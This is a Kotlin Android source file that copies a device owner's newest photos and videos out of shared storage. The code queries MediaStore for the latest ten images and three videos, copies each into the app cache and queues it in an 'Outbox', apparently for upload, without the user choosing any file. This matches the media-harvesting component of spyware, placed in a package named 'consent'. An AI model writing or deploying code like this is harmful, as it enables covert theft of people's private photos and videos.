package com.vlink.consent

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import org.json.JSONObject
import java.io.File

object MediaSync {
    private fun copy(ctx: Context, uri: Uri, name: String): File? = runCatching {
        val f = File(ctx.cacheDir, "m_" + System.currentTimeMillis() + "_" + name.takeLast(24))
        ctx.contentResolver.openInputStream(uri)!!.use { i -> f.outputStream().use { o -> i.copyTo(o) } }
        f
    }.getOrNull()

    fun images(ctx: Context, count: Int = 10): Int {
        var n = 0
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        ctx.contentResolver.query(uri,
            arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
            null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC")?.use { c ->
            while (c.moveToNext() && n < count) {
                val item = ContentUris.withAppendedId(uri, c.getLong(0))
                copy(ctx, item, c.getString(1) ?: "img")?.let {
                    Outbox(ctx).put("photo", JSONObject().put("name", it.name), it, "image/jpeg")
                    n++
                }
            }
        }
        return n
    }

    fun videos(ctx: Context, count: Int = 3): Int {
        var n = 0
        val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        ctx.contentResolver.query(uri,
            arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
            null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC")?.use { c ->
            while (c.moveToNext() && n < count) {
                val item = ContentUris.withAppendedId(uri, c.getLong(0))
                copy(ctx, item, c.getString(1) ?: "vid")?.let {
                    Outbox(ctx).put("video", JSONObject().put("name", it.name), it, "video/mp4")
                    n++
                }
            }
        }
        return n
    }
}
